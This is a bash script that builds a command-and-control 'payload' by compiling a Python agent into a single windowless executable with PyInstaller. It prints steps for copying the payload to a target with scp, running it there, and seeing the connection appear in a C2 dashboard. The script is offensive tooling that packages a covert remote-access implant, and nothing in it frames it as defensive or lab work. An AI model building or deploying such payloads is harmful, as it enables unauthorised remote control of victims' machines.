#!/bin/bash

# Manual Payload Builder with Error Handling
echo "========================================="
echo "   C2 Payload Builder - Manual Mode"
echo "========================================="
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration
AGENT_FILE="/app/agent_advanced.py"
OUTPUT_DIR="/app/payloads"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_NAME="payload_${TIMESTAMP}"

# Check if agent exists
if [ ! -f "$AGENT_FILE" ]; then
    echo -e "${RED}[ERROR]${NC} Agent file not found: $AGENT_FILE"
    exit 1
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${YELLOW}[INFO]${NC} Building payload..."
echo -e "${YELLOW}[INFO]${NC} Source: $AGENT_FILE"
echo -e "${YELLOW}[INFO]${NC} Output: $OUTPUT_DIR/$OUTPUT_NAME"
echo ""

# Build with PyInstaller
echo -e "${YELLOW}[BUILD]${NC} Running PyInstaller..."

pyinstaller \
    --onefile \
    --noconsole \
    --name "$OUTPUT_NAME" \
    --distpath "$OUTPUT_DIR" \
    --workpath "/tmp/build_${TIMESTAMP}" \
    --specpath "/tmp/spec_${TIMESTAMP}" \
    --clean \
    "$AGENT_FILE" 2>&1 | tee "/tmp/build_log_${TIMESTAMP}.txt"

BUILD_EXIT_CODE=${PIPESTATUS[0]}

echo ""

if [ $BUILD_EXIT_CODE -eq 0 ]; then
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}   ✓ Build Successful!${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo ""
    
    PAYLOAD_PATH="$OUTPUT_DIR/$OUTPUT_NAME"
    
    if [ -f "$PAYLOAD_PATH" ]; then
        echo -e "${GREEN}[SUCCESS]${NC} Payload created:"
        echo "  Path: $PAYLOAD_PATH"
        echo "  Size: $(du -h "$PAYLOAD_PATH" | cut -f1)"
        echo ""
        echo "Next steps:"
        echo "  1. Transfer to target: scp $PAYLOAD_PATH user@target:~/"
        echo "  2. Execute on target"
        echo "  3. Connect will appear in dashboard"
    else
        echo -e "${RED}[ERROR]${NC} Payload file not found after build"
        exit 1
    fi
    
    # Cleanup
    echo ""
    echo -e "${YELLOW}[CLEANUP]${NC} Removing temporary files..."
    rm -rf "/tmp/build_${TIMESTAMP}"
    rm -rf "/tmp/spec_${TIMESTAMP}"
    
    echo -e "${GREEN}✓${NC} Done!"
    
else
    echo -e "${RED}=========================================${NC}"
    echo -e "${RED}   ✗ Build Failed!${NC}"
    echo -e "${RED}=========================================${NC}"
    echo ""
    echo -e "${RED}[ERROR]${NC} PyInstaller failed with exit code: $BUILD_EXIT_CODE"
    echo ""
    echo "Check the log file for details:"
    echo "  /tmp/build_log_${TIMESTAMP}.txt"
    echo ""
    echo "Common issues:"
    echo "  1. Missing dependencies: pip install -r requirements.txt"
    echo "  2. Permission issues: Check write permissions on $OUTPUT_DIR"
    echo "  3. PyInstaller version: Try upgrading with 'pip install --upgrade pyinstaller'"
    echo ""
    exit 1
fi
